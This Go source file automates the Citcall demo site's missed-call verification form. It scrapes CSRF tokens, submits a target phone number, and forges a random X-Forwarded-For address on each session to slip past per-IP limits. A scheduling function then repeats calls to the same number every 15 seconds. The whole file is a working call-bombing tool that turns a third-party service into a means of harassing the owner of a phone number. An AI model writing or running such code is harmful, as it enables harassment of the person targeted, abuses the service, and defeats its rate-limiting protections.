package main

import (
	"errors"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"
)

const citCallURL = "https://www.citcall.com/demo"

type httpRequest struct {
	client   *http.Client
	method   string
	path     string
	body     io.Reader
	headers  map[string]string
	customIP string
}

func (r httpRequest) send() (string, error) {
	req, err := http.NewRequest(r.method, citCallURL+r.path, r.body)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	if len(r.customIP) > 0 {
		req.Header.Set("X-Forwarded-For", r.customIP)
	}
	for k, v := range r.headers {
		req.Header.Set(k, v)
	}
	if err != nil {
		return "", err
	}
	resp, err := r.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func sendCall(phoneNumber string) (err error) {
	cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: cookieJar,
	}
	ipv4 := randIPv4()
	resp, err := httpRequest{client, "GET", "/", nil, nil, ipv4}.send()
	if err != nil {
		return
	}
	tokenRegexp := regexp.MustCompile(`csrf_token" value="(.+?)">`)
	matches := tokenRegexp.FindStringSubmatch(resp)
	if len(matches) != 2 {
		return errors.New("unexpected resp")
	}
	token := matches[1]
	form := url.Values{}
	form.Add("cellNo", phoneNumber)
	form.Add("csrf_token", token)
	resp, err = httpRequest{
		client: client,
		method: "POST",
		path:   "/verification.php",
		body:   strings.NewReader(form.Encode()),
		headers: map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"Referer":      citCallURL + "/",
		},
		customIP: ipv4,
	}.send()
	if err != nil {
		return
	}
	tokenRegexp = regexp.MustCompile(`var csrf_token = "(.+)";`)
	matches = tokenRegexp.FindStringSubmatch(resp)
	if len(matches) != 2 {
		return errors.New("unexpected resp")
	}
	token = matches[1]
	form = url.Values{}
	form.Add("cid", phoneNumber)
	form.Add("csrf_token", token)
	form.Add("trying", "0")
	resp, err = httpRequest{
		client: client,
		method: "POST",
		path:   "/misscallapi.php",
		body:   strings.NewReader(form.Encode()),
		headers: map[string]string{
			"Content-Type":     "application/x-www-form-urlencoded",
			"X-Requested-With": "XMLHTTPRequest",
		},
		customIP: ipv4,
	}.send()
	if err != nil {
		return
	}
	return
}

func sendCallUntil(phoneNumber string, numOfCalls int, t time.Time) {
	<-time.After(t.Sub(time.Now()))
	for i := 0; i < numOfCalls; i++ {
		if err := sendCall(phoneNumber); err != nil {
			break
		}
		<-time.After(15 * time.Second)
	}
}

func randIPv4() string {
	rand.Seed(time.Now().UTC().UnixNano())
	part := func() byte {
		return byte(rand.Intn(255))
	}
	ip := net.IPv4(part(), part(), part(), part())
	return ip.String()
}
